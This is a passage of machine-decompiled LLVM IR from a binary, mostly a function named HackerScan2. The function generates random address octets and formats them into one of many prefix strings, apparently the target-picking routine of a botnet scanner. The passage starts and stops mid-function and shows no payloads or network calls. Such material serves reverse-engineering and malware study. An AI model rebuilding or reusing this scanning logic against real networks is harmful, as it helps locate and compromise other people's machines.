dec_label_pc_8049b7a:                             ; preds = %dec_label_pc_80499ee, %dec_label_pc_8049b6c, %dec_label_pc_8049b53.backedge, %dec_label_pc_8049b3b, %dec_label_pc_8049b1f, %entry
  %stack_var_-24.0 = phi i32 [ 0, %entry ], [ 1, %dec_label_pc_8049b1f ], [ 1, %dec_label_pc_8049b3b ], [ 0, %dec_label_pc_8049b53.backedge ], [ 0, %dec_label_pc_8049b6c ], [ 0, %dec_label_pc_80499ee ]
  br label %dec_label_pc_8049b96

dec_label_pc_8049b96:                             ; preds = %dec_label_pc_8049aef, %dec_label_pc_8049aae, %dec_label_pc_8049ada, %dec_label_pc_8049a55, %dec_label_pc_8049a89, %dec_label_pc_8049b7a
  %stack_var_-172.0 = phi i32 [ %stack_var_-24.0, %dec_label_pc_8049b7a ], [ 0, %dec_label_pc_8049a89 ], [ 0, %dec_label_pc_8049a55 ], [ 0, %dec_label_pc_8049ada ], [ 0, %dec_label_pc_8049aae ], [ 0, %dec_label_pc_8049aef ]
  ret i32 %stack_var_-172.0

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v4_8049acc, { 1, 2, 0 }
  uselistorder i32 %v4_8049a7b, { 1, 2, 0 }
  uselistorder i32 %v5_8049a58, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049b96, { 5, 0, 2, 1, 4, 3 }
  uselistorder label %dec_label_pc_8049b7a, { 1, 3, 4, 2, 0, 5 }
  uselistorder label %dec_label_pc_8049b53.backedge, { 2, 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049ba8 = load i32, i32* @ebx, align 4
  store i32 %v0_8049ba8, i32* %stack_var_-8, align 4
  store i8 0, i8* @global_var_805f4f7.27, align 1
  store i8 0, i8* @global_var_805f4f8.28, align 8
  store i8 0, i8* @global_var_805f4f9.29, align 1
  store i8 0, i8* @global_var_805f4fa.30, align 2
  %v1_8049bc8 = call i32 @random()
  %v2_8049bea = sdiv i32 %v1_8049bc8, 51
  store i32 %v2_8049bea, i32* @ebx, align 4
  %tmp = mul i32 %v2_8049bea, -255
  %v2_8049bfa = add i32 %v1_8049bc8, %tmp
  %v14_8049bfa = trunc i32 %v2_8049bfa to i8
  store i32 %v2_8049bfa, i32* @eax, align 4
  store i8 %v14_8049bfa, i8* @global_var_805f4f7.27, align 1
  %v1_8049c08 = call i32 @random()
  %v2_8049c2a = sdiv i32 %v1_8049c08, 51
  store i32 %v2_8049c2a, i32* @ebx, align 4
  %tmp21 = mul i32 %v2_8049c2a, -255
  %v2_8049c3a = add i32 %v1_8049c08, %tmp21
  %v14_8049c3a = trunc i32 %v2_8049c3a to i8
  store i32 %v2_8049c3a, i32* @eax, align 4
  store i8 %v14_8049c3a, i8* @global_var_805f4f8.28, align 8
  %v1_8049c48 = call i32 @random()
  %v2_8049c6a = sdiv i32 %v1_8049c48, 51
  store i32 %v2_8049c6a, i32* @ebx, align 4
  %tmp22 = mul i32 %v2_8049c6a, -255
  %v2_8049c7a = add i32 %v1_8049c48, %tmp22
  %v14_8049c7a = trunc i32 %v2_8049c7a to i8
  store i32 %v2_8049c7a, i32* @eax, align 4
  store i8 %v14_8049c7a, i8* @global_var_805f4f9.29, align 1
  %v1_8049c88 = call i32 @random()
  %v2_8049caa = sdiv i32 %v1_8049c88, 51
  store i32 %v2_8049caa, i32* @ebx, align 4
  %tmp23 = mul i32 %v2_8049caa, -255
  %v2_8049cba = add i32 %v1_8049c88, %tmp23
  %v14_8049cba = trunc i32 %v2_8049cba to i8
  store i32 %v2_8049cba, i32* @eax, align 4
  store i8 %v14_8049cba, i8* @global_var_805f4fa.30, align 2
  %v1_8049cc8 = call i32 @random()
  %v2_8049ce5 = srem i32 %v1_8049cc8, 208
  %v12_8049cff = icmp eq i32 %v2_8049ce5, 0
  store i32 %v2_8049ce5, i32* @edx, align 4
  %v1_8049d0a = icmp eq i1 %v12_8049cff, false
  br i1 %v1_8049d0a, label %dec_label_pc_8049d3c, label %dec_label_pc_8049d0c

dec_label_pc_8049d0c:                             ; preds = %entry
  %v0_8049d0c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049d0c = zext i8 %v0_8049d0c to i32
  store i32 %v1_8049d0c, i32* @edx, align 4
  %v0_8049d16 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049d16 = zext i8 %v0_8049d16 to i32
  %v2_8049d25 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d25, i32* @ebx, align 4
  %v4_8049d37 = call i32 @szprintf(i32 %v2_8049d25, i32 ptrtoint ([12 x i8]* @global_var_80592b1.31 to i32), i32 %v1_8049d16)
  br label %dec_label_pc_8049d3c

dec_label_pc_8049d3c:                             ; preds = %entry, %dec_label_pc_8049d0c
  %v13_8049d3c = icmp eq i32 %v2_8049ce5, 1
  %v1_8049d40 = icmp eq i1 %v13_8049d3c, false
  br i1 %v1_8049d40, label %dec_label_pc_8049d72, label %dec_label_pc_8049d42

dec_label_pc_8049d42:                             ; preds = %dec_label_pc_8049d3c
  %v0_8049d42 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049d42 = zext i8 %v0_8049d42 to i32
  store i32 %v1_8049d42, i32* @edx, align 4
  %v0_8049d4c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049d4c = zext i8 %v0_8049d4c to i32
  %v2_8049d5b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d5b, i32* @ebx, align 4
  %v4_8049d6d = call i32 @szprintf(i32 %v2_8049d5b, i32 ptrtoint ([14 x i8]* @global_var_80592bd.32 to i32), i32 %v1_8049d4c)
  br label %dec_label_pc_8049d72

dec_label_pc_8049d72:                             ; preds = %dec_label_pc_8049d3c, %dec_label_pc_8049d42
  %v13_8049d72 = icmp eq i32 %v2_8049ce5, 2
  %v1_8049d76 = icmp eq i1 %v13_8049d72, false
  br i1 %v1_8049d76, label %dec_label_pc_8049da8, label %dec_label_pc_8049d78

dec_label_pc_8049d78:                             ; preds = %dec_label_pc_8049d72
  %v0_8049d78 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049d78 = zext i8 %v0_8049d78 to i32
  store i32 %v1_8049d78, i32* @edx, align 4
  %v0_8049d82 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049d82 = zext i8 %v0_8049d82 to i32
  %v2_8049d91 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049d91, i32* @ebx, align 4
  %v4_8049da3 = call i32 @szprintf(i32 %v2_8049d91, i32 ptrtoint ([11 x i8]* @global_var_80592cb.33 to i32), i32 %v1_8049d82)
  br label %dec_label_pc_8049da8

dec_label_pc_8049da8:                             ; preds = %dec_label_pc_8049d72, %dec_label_pc_8049d78
  %v13_8049da8 = icmp eq i32 %v2_8049ce5, 3
  %v1_8049dac = icmp eq i1 %v13_8049da8, false
  br i1 %v1_8049dac, label %dec_label_pc_8049dde, label %dec_label_pc_8049dae

dec_label_pc_8049dae:                             ; preds = %dec_label_pc_8049da8
  %v0_8049dae = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049dae = zext i8 %v0_8049dae to i32
  store i32 %v1_8049dae, i32* @edx, align 4
  %v0_8049db8 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049db8 = zext i8 %v0_8049db8 to i32
  %v2_8049dc7 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dc7, i32* @ebx, align 4
  %v4_8049dd9 = call i32 @szprintf(i32 %v2_8049dc7, i32 ptrtoint ([13 x i8]* @global_var_80592d6.34 to i32), i32 %v1_8049db8)
  br label %dec_label_pc_8049dde

dec_label_pc_8049dde:                             ; preds = %dec_label_pc_8049da8, %dec_label_pc_8049dae
  %v13_8049dde = icmp eq i32 %v2_8049ce5, 4
  %v1_8049de2 = icmp eq i1 %v13_8049dde, false
  br i1 %v1_8049de2, label %dec_label_pc_8049e14, label %dec_label_pc_8049de4

dec_label_pc_8049de4:                             ; preds = %dec_label_pc_8049dde
  %v0_8049de4 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049de4 = zext i8 %v0_8049de4 to i32
  store i32 %v1_8049de4, i32* @edx, align 4
  %v0_8049dee = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049dee = zext i8 %v0_8049dee to i32
  %v2_8049dfd = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049dfd, i32* @ebx, align 4
  %v4_8049e0f = call i32 @szprintf(i32 %v2_8049dfd, i32 ptrtoint ([11 x i8]* @global_var_80592e3.35 to i32), i32 %v1_8049dee)
  br label %dec_label_pc_8049e14

dec_label_pc_8049e14:                             ; preds = %dec_label_pc_8049dde, %dec_label_pc_8049de4
  %v13_8049e14 = icmp eq i32 %v2_8049ce5, 5
  %v1_8049e18 = icmp eq i1 %v13_8049e14, false
  br i1 %v1_8049e18, label %dec_label_pc_8049e4a, label %dec_label_pc_8049e1a

dec_label_pc_8049e1a:                             ; preds = %dec_label_pc_8049e14
  %v0_8049e1a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049e1a = zext i8 %v0_8049e1a to i32
  store i32 %v1_8049e1a, i32* @edx, align 4
  %v0_8049e24 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049e24 = zext i8 %v0_8049e24 to i32
  %v2_8049e33 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e33, i32* @ebx, align 4
  %v4_8049e45 = call i32 @szprintf(i32 %v2_8049e33, i32 ptrtoint ([13 x i8]* @global_var_80592ee.36 to i32), i32 %v1_8049e24)
  br label %dec_label_pc_8049e4a

dec_label_pc_8049e4a:                             ; preds = %dec_label_pc_8049e14, %dec_label_pc_8049e1a
  %v13_8049e4a = icmp eq i32 %v2_8049ce5, 6
  %v1_8049e4e = icmp eq i1 %v13_8049e4a, false
  br i1 %v1_8049e4e, label %dec_label_pc_8049e80, label %dec_label_pc_8049e50

dec_label_pc_8049e50:                             ; preds = %dec_label_pc_8049e4a
  %v0_8049e50 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049e50 = zext i8 %v0_8049e50 to i32
  store i32 %v1_8049e50, i32* @edx, align 4
  %v0_8049e5a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049e5a = zext i8 %v0_8049e5a to i32
  %v2_8049e69 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e69, i32* @ebx, align 4
  %v4_8049e7b = call i32 @szprintf(i32 %v2_8049e69, i32 ptrtoint ([12 x i8]* @global_var_80592fb.37 to i32), i32 %v1_8049e5a)
  br label %dec_label_pc_8049e80

dec_label_pc_8049e80:                             ; preds = %dec_label_pc_8049e4a, %dec_label_pc_8049e50
  %v13_8049e80 = icmp eq i32 %v2_8049ce5, 7
  %v1_8049e84 = icmp eq i1 %v13_8049e80, false
  br i1 %v1_8049e84, label %dec_label_pc_8049eb6, label %dec_label_pc_8049e86

dec_label_pc_8049e86:                             ; preds = %dec_label_pc_8049e80
  %v0_8049e86 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049e86 = zext i8 %v0_8049e86 to i32
  store i32 %v1_8049e86, i32* @edx, align 4
  %v0_8049e90 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049e90 = zext i8 %v0_8049e90 to i32
  %v2_8049e9f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049e9f, i32* @ebx, align 4
  %v4_8049eb1 = call i32 @szprintf(i32 %v2_8049e9f, i32 ptrtoint ([13 x i8]* @global_var_8059307.38 to i32), i32 %v1_8049e90)
  br label %dec_label_pc_8049eb6

dec_label_pc_8049eb6:                             ; preds = %dec_label_pc_8049e80, %dec_label_pc_8049e86
  %v13_8049eb6 = icmp eq i32 %v2_8049ce5, 8
  %v1_8049eba = icmp eq i1 %v13_8049eb6, false
  br i1 %v1_8049eba, label %dec_label_pc_8049eec, label %dec_label_pc_8049ebc

dec_label_pc_8049ebc:                             ; preds = %dec_label_pc_8049eb6
  %v0_8049ebc = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049ebc = zext i8 %v0_8049ebc to i32
  store i32 %v1_8049ebc, i32* @edx, align 4
  %v0_8049ec6 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049ec6 = zext i8 %v0_8049ec6 to i32
  %v2_8049ed5 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049ed5, i32* @ebx, align 4
  %v4_8049ee7 = call i32 @szprintf(i32 %v2_8049ed5, i32 ptrtoint ([13 x i8]* @global_var_8059314.39 to i32), i32 %v1_8049ec6)
  br label %dec_label_pc_8049eec

dec_label_pc_8049eec:                             ; preds = %dec_label_pc_8049eb6, %dec_label_pc_8049ebc
  %v13_8049eec = icmp eq i32 %v2_8049ce5, 9
  %v1_8049ef0 = icmp eq i1 %v13_8049eec, false
  br i1 %v1_8049ef0, label %dec_label_pc_8049f22, label %dec_label_pc_8049ef2

dec_label_pc_8049ef2:                             ; preds = %dec_label_pc_8049eec
  %v0_8049ef2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049ef2 = zext i8 %v0_8049ef2 to i32
  store i32 %v1_8049ef2, i32* @edx, align 4
  %v0_8049efc = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049efc = zext i8 %v0_8049efc to i32
  %v2_8049f0b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f0b, i32* @ebx, align 4
  %v4_8049f1d = call i32 @szprintf(i32 %v2_8049f0b, i32 ptrtoint ([13 x i8]* @global_var_8059321.40 to i32), i32 %v1_8049efc)
  br label %dec_label_pc_8049f22

dec_label_pc_8049f22:                             ; preds = %dec_label_pc_8049eec, %dec_label_pc_8049ef2
  %v13_8049f22 = icmp eq i32 %v2_8049ce5, 10
  %v1_8049f26 = icmp eq i1 %v13_8049f22, false
  br i1 %v1_8049f26, label %dec_label_pc_8049f58, label %dec_label_pc_8049f28

dec_label_pc_8049f28:                             ; preds = %dec_label_pc_8049f22
  %v0_8049f28 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049f28 = zext i8 %v0_8049f28 to i32
  store i32 %v1_8049f28, i32* @edx, align 4
  %v0_8049f32 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049f32 = zext i8 %v0_8049f32 to i32
  %v2_8049f41 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f41, i32* @ebx, align 4
  %v4_8049f53 = call i32 @szprintf(i32 %v2_8049f41, i32 ptrtoint ([14 x i8]* @global_var_805932e.41 to i32), i32 %v1_8049f32)
  br label %dec_label_pc_8049f58

dec_label_pc_8049f58:                             ; preds = %dec_label_pc_8049f22, %dec_label_pc_8049f28
  %v13_8049f58 = icmp eq i32 %v2_8049ce5, 11
  %v1_8049f5c = icmp eq i1 %v13_8049f58, false
  br i1 %v1_8049f5c, label %dec_label_pc_8049f8e, label %dec_label_pc_8049f5e

dec_label_pc_8049f5e:                             ; preds = %dec_label_pc_8049f58
  %v0_8049f5e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049f5e = zext i8 %v0_8049f5e to i32
  store i32 %v1_8049f5e, i32* @edx, align 4
  %v0_8049f68 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049f68 = zext i8 %v0_8049f68 to i32
  %v2_8049f77 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049f77, i32* @ebx, align 4
  %v4_8049f89 = call i32 @szprintf(i32 %v2_8049f77, i32 ptrtoint ([11 x i8]* @global_var_805933c.42 to i32), i32 %v1_8049f68)
  br label %dec_label_pc_8049f8e

dec_label_pc_8049f8e:                             ; preds = %dec_label_pc_8049f58, %dec_label_pc_8049f5e
  %v13_8049f8e = icmp eq i32 %v2_8049ce5, 12
  %v1_8049f92 = icmp eq i1 %v13_8049f8e, false
  br i1 %v1_8049f92, label %dec_label_pc_8049fc4, label %dec_label_pc_8049f94

dec_label_pc_8049f94:                             ; preds = %dec_label_pc_8049f8e
  %v0_8049f94 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049f94 = zext i8 %v0_8049f94 to i32
  store i32 %v1_8049f94, i32* @edx, align 4
  %v0_8049f9e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049f9e = zext i8 %v0_8049f9e to i32
  %v2_8049fad = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fad, i32* @ebx, align 4
  %v4_8049fbf = call i32 @szprintf(i32 %v2_8049fad, i32 ptrtoint ([13 x i8]* @global_var_8059347.43 to i32), i32 %v1_8049f9e)
  br label %dec_label_pc_8049fc4

dec_label_pc_8049fc4:                             ; preds = %dec_label_pc_8049f8e, %dec_label_pc_8049f94
  %v13_8049fc4 = icmp eq i32 %v2_8049ce5, 13
  %v1_8049fc8 = icmp eq i1 %v13_8049fc4, false
  br i1 %v1_8049fc8, label %dec_label_pc_8049ffa, label %dec_label_pc_8049fca

dec_label_pc_8049fca:                             ; preds = %dec_label_pc_8049fc4
  %v0_8049fca = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_8049fca = zext i8 %v0_8049fca to i32
  store i32 %v1_8049fca, i32* @edx, align 4
  %v0_8049fd4 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_8049fd4 = zext i8 %v0_8049fd4 to i32
  %v2_8049fe3 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049fe3, i32* @ebx, align 4
  %v4_8049ff5 = call i32 @szprintf(i32 %v2_8049fe3, i32 ptrtoint ([13 x i8]* @global_var_8059354.44 to i32), i32 %v1_8049fd4)
  br label %dec_label_pc_8049ffa

dec_label_pc_8049ffa:                             ; preds = %dec_label_pc_8049fc4, %dec_label_pc_8049fca
  %v13_8049ffa = icmp eq i32 %v2_8049ce5, 14
  %v1_8049ffe = icmp eq i1 %v13_8049ffa, false
  br i1 %v1_8049ffe, label %dec_label_pc_804a030, label %dec_label_pc_804a000

dec_label_pc_804a000:                             ; preds = %dec_label_pc_8049ffa
  %v0_804a000 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a000 = zext i8 %v0_804a000 to i32
  store i32 %v1_804a000, i32* @edx, align 4
  %v0_804a00a = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a00a = zext i8 %v0_804a00a to i32
  %v2_804a019 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a019, i32* @ebx, align 4
  %v4_804a02b = call i32 @szprintf(i32 %v2_804a019, i32 ptrtoint ([13 x i8]* @global_var_8059361.45 to i32), i32 %v1_804a00a)
  br label %dec_label_pc_804a030

dec_label_pc_804a030:                             ; preds = %dec_label_pc_8049ffa, %dec_label_pc_804a000
  %v13_804a030 = icmp eq i32 %v2_8049ce5, 15
  %v1_804a034 = icmp eq i1 %v13_804a030, false
  br i1 %v1_804a034, label %dec_label_pc_804a066, label %dec_label_pc_804a036

dec_label_pc_804a036:                             ; preds = %dec_label_pc_804a030
  %v0_804a036 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a036 = zext i8 %v0_804a036 to i32
  store i32 %v1_804a036, i32* @edx, align 4
  %v0_804a040 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a040 = zext i8 %v0_804a040 to i32
  %v2_804a04f = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a04f, i32* @ebx, align 4
  %v4_804a061 = call i32 @szprintf(i32 %v2_804a04f, i32 ptrtoint ([13 x i8]* @global_var_805936e.46 to i32), i32 %v1_804a040)
  br label %dec_label_pc_804a066

dec_label_pc_804a066:                             ; preds = %dec_label_pc_804a030, %dec_label_pc_804a036
  %v10_804a066 = icmp eq i32 %v2_8049ce5, 16
  %v1_804a06a = icmp eq i1 %v10_804a066, false
  br i1 %v1_804a06a, label %dec_label_pc_804a09c, label %dec_label_pc_804a06c

dec_label_pc_804a06c:                             ; preds = %dec_label_pc_804a066
  %v0_804a06c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a06c = zext i8 %v0_804a06c to i32
  store i32 %v1_804a06c, i32* @edx, align 4
  %v0_804a076 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a076 = zext i8 %v0_804a076 to i32
  %v2_804a085 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a085, i32* @ebx, align 4
  %v4_804a097 = call i32 @szprintf(i32 %v2_804a085, i32 ptrtoint ([13 x i8]* @global_var_805937b.47 to i32), i32 %v1_804a076)
  br label %dec_label_pc_804a09c

dec_label_pc_804a09c:                             ; preds = %dec_label_pc_804a066, %dec_label_pc_804a06c
  %v13_804a09c = icmp eq i32 %v2_8049ce5, 17
  %v1_804a0a0 = icmp eq i1 %v13_804a09c, false
  br i1 %v1_804a0a0, label %dec_label_pc_804a0d2, label %dec_label_pc_804a0a2

dec_label_pc_804a0a2:                             ; preds = %dec_label_pc_804a09c
  %v0_804a0a2 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a0a2 = zext i8 %v0_804a0a2 to i32
  store i32 %v1_804a0a2, i32* @edx, align 4
  %v0_804a0ac = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a0ac = zext i8 %v0_804a0ac to i32
  %v2_804a0bb = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0bb, i32* @ebx, align 4
  %v4_804a0cd = call i32 @szprintf(i32 %v2_804a0bb, i32 ptrtoint ([13 x i8]* @global_var_8059388.48 to i32), i32 %v1_804a0ac)
  br label %dec_label_pc_804a0d2

dec_label_pc_804a0d2:                             ; preds = %dec_label_pc_804a09c, %dec_label_pc_804a0a2
  %v13_804a0d2 = icmp eq i32 %v2_8049ce5, 18
  %v1_804a0d6 = icmp eq i1 %v13_804a0d2, false
  br i1 %v1_804a0d6, label %dec_label_pc_804a108, label %dec_label_pc_804a0d8

dec_label_pc_804a0d8:                             ; preds = %dec_label_pc_804a0d2
  %v0_804a0d8 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a0d8 = zext i8 %v0_804a0d8 to i32
  store i32 %v1_804a0d8, i32* @edx, align 4
  %v0_804a0e2 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a0e2 = zext i8 %v0_804a0e2 to i32
  %v2_804a0f1 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a0f1, i32* @ebx, align 4
  %v4_804a103 = call i32 @szprintf(i32 %v2_804a0f1, i32 ptrtoint ([13 x i8]* @global_var_8059395.49 to i32), i32 %v1_804a0e2)
  br label %dec_label_pc_804a108

dec_label_pc_804a108:                             ; preds = %dec_label_pc_804a0d2, %dec_label_pc_804a0d8
  %v13_804a108 = icmp eq i32 %v2_8049ce5, 19
  %v1_804a10c = icmp eq i1 %v13_804a108, false
  br i1 %v1_804a10c, label %dec_label_pc_804a13e, label %dec_label_pc_804a10e

dec_label_pc_804a10e:                             ; preds = %dec_label_pc_804a108
  %v0_804a10e = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a10e = zext i8 %v0_804a10e to i32
  store i32 %v1_804a10e, i32* @edx, align 4
  %v0_804a118 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a118 = zext i8 %v0_804a118 to i32
  %v2_804a127 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a127, i32* @ebx, align 4
  %v4_804a139 = call i32 @szprintf(i32 %v2_804a127, i32 ptrtoint ([11 x i8]* @global_var_80593a2.50 to i32), i32 %v1_804a118)
  br label %dec_label_pc_804a13e

dec_label_pc_804a13e:                             ; preds = %dec_label_pc_804a108, %dec_label_pc_804a10e
  %v13_804a13e = icmp eq i32 %v2_8049ce5, 20
  %v1_804a142 = icmp eq i1 %v13_804a13e, false
  br i1 %v1_804a142, label %dec_label_pc_804a174, label %dec_label_pc_804a144

dec_label_pc_804a144:                             ; preds = %dec_label_pc_804a13e
  %v0_804a144 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a144 = zext i8 %v0_804a144 to i32
  store i32 %v1_804a144, i32* @edx, align 4
  %v0_804a14e = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a14e = zext i8 %v0_804a14e to i32
  %v2_804a15d = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a15d, i32* @ebx, align 4
  %v4_804a16f = call i32 @szprintf(i32 %v2_804a15d, i32 ptrtoint ([12 x i8]* @global_var_80593ad.51 to i32), i32 %v1_804a14e)
  br label %dec_label_pc_804a174

dec_label_pc_804a174:                             ; preds = %dec_label_pc_804a13e, %dec_label_pc_804a144
  %v13_804a174 = icmp eq i32 %v2_8049ce5, 21
  %v1_804a178 = icmp eq i1 %v13_804a174, false
  br i1 %v1_804a178, label %dec_label_pc_804a1aa, label %dec_label_pc_804a17a

dec_label_pc_804a17a:                             ; preds = %dec_label_pc_804a174
  %v0_804a17a = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a17a = zext i8 %v0_804a17a to i32
  store i32 %v1_804a17a, i32* @edx, align 4
  %v0_804a184 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a184 = zext i8 %v0_804a184 to i32
  %v2_804a193 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a193, i32* @ebx, align 4
  %v4_804a1a5 = call i32 @szprintf(i32 %v2_804a193, i32 ptrtoint ([13 x i8]* @global_var_80593b9.52 to i32), i32 %v1_804a184)
  br label %dec_label_pc_804a1aa

dec_label_pc_804a1aa:                             ; preds = %dec_label_pc_804a174, %dec_label_pc_804a17a
  %v13_804a1aa = icmp eq i32 %v2_8049ce5, 22
  %v1_804a1ae = icmp eq i1 %v13_804a1aa, false
  br i1 %v1_804a1ae, label %dec_label_pc_804a1e0, label %dec_label_pc_804a1b0

dec_label_pc_804a1b0:                             ; preds = %dec_label_pc_804a1aa
  %v0_804a1b0 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a1b0 = zext i8 %v0_804a1b0 to i32
  store i32 %v1_804a1b0, i32* @edx, align 4
  %v0_804a1ba = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a1ba = zext i8 %v0_804a1ba to i32
  %v2_804a1c9 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1c9, i32* @ebx, align 4
  %v4_804a1db = call i32 @szprintf(i32 %v2_804a1c9, i32 ptrtoint ([11 x i8]* @global_var_80593c6.53 to i32), i32 %v1_804a1ba)
  br label %dec_label_pc_804a1e0

dec_label_pc_804a1e0:                             ; preds = %dec_label_pc_804a1aa, %dec_label_pc_804a1b0
  %v13_804a1e0 = icmp eq i32 %v2_8049ce5, 23
  %v1_804a1e4 = icmp eq i1 %v13_804a1e0, false
  br i1 %v1_804a1e4, label %dec_label_pc_804a216, label %dec_label_pc_804a1e6

dec_label_pc_804a1e6:                             ; preds = %dec_label_pc_804a1e0
  %v0_804a1e6 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a1e6 = zext i8 %v0_804a1e6 to i32
  store i32 %v1_804a1e6, i32* @edx, align 4
  %v0_804a1f0 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a1f0 = zext i8 %v0_804a1f0 to i32
  %v2_804a1ff = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a1ff, i32* @ebx, align 4
  %v4_804a211 = call i32 @szprintf(i32 %v2_804a1ff, i32 ptrtoint ([11 x i8]* @global_var_80593d1.54 to i32), i32 %v1_804a1f0)
  br label %dec_label_pc_804a216

dec_label_pc_804a216:                             ; preds = %dec_label_pc_804a1e0, %dec_label_pc_804a1e6
  %v13_804a216 = icmp eq i32 %v2_8049ce5, 24
  %v1_804a21a = icmp eq i1 %v13_804a216, false
  br i1 %v1_804a21a, label %dec_label_pc_804a24c, label %dec_label_pc_804a21c

dec_label_pc_804a21c:                             ; preds = %dec_label_pc_804a216
  %v0_804a21c = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a21c = zext i8 %v0_804a21c to i32
  store i32 %v1_804a21c, i32* @edx, align 4
  %v0_804a226 = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a226 = zext i8 %v0_804a226 to i32
  %v2_804a235 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a235, i32* @ebx, align 4
  %v4_804a247 = call i32 @szprintf(i32 %v2_804a235, i32 ptrtoint ([12 x i8]* @global_var_80593dc.55 to i32), i32 %v1_804a226)
  br label %dec_label_pc_804a24c

dec_label_pc_804a24c:                             ; preds = %dec_label_pc_804a216, %dec_label_pc_804a21c
  %v13_804a24c = icmp eq i32 %v2_8049ce5, 25
  %v1_804a250 = icmp eq i1 %v13_804a24c, false
  br i1 %v1_804a250, label %dec_label_pc_804a282, label %dec_label_pc_804a252

dec_label_pc_804a252:                             ; preds = %dec_label_pc_804a24c
  %v0_804a252 = load i8, i8* @global_var_805f4fa.30, align 2
  %v1_804a252 = zext i8 %v0_804a252 to i32
  store i32 %v1_804a252, i32* @edx, align 4
  %v0_804a25c = load i8, i8* @global_var_805f4f9.29, align 1
  %v1_804a25c = zext i8 %v0_804a25c to i32
  %v2_804a26b = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_804a26b, i32* @ebx, align 4
  %v4_804a27d = call i32 @szprintf(i32 %v2_804a26b, i32 ptrtoint ([12 x i8]* @global_var_80593e8.56 to i32), i32 %v1_804a25c)
  br label %dec_label_pc_804a282

dec_label_pc_804a282:                             ; preds = %dec_label_pc_804a24c, %dec_label_pc_804a252
  %v13_804a282 = icmp eq i32 %v2_8049ce5, 26
